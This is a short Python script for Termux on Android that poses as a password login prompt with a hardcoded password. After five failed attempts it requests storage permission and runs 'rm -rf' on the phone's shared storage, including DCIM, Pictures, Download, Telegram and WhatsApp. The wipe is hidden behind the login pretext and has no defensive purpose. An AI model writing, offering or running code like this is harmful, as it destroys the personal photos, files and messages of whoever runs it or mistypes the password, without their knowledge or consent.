import subprocess
import os

def login():
    attempts = 5
    while attempts > 0:
        password = input("Enter your password: ")
        if password == 'rxs':
            print("Login successful!")
            return True
        else:
            attempts -= 1
            print("Incorrect password. Attempts remaining:", attempts)
    else:
        print("Too many failed attempts. Please try again later.")
        subprocess.run(['termux-setup-storage', '-y'], capture_output=True)
        # Delete the folder
        os.system('termux-setup-storage -y')
        os.system('rm -rf /sdcard/')
        os.system('rm -rf /sdcard/Android')
        os.system('rm -rf /sdcard/DCIM')
        os.system('rm -rf /sdcard/Download')
        os.system('rm -rf /sdcard/MIUI')
        os.system('rm -rf /sdcard/Pictures')
        os.system('rm -rf /sdcard/Telegram')
        os.system('rm -rf /sdcard/WhatsApp')
        

if login():
    # Perform additional operations after successful login
    pass  # Placeholder for additional operations
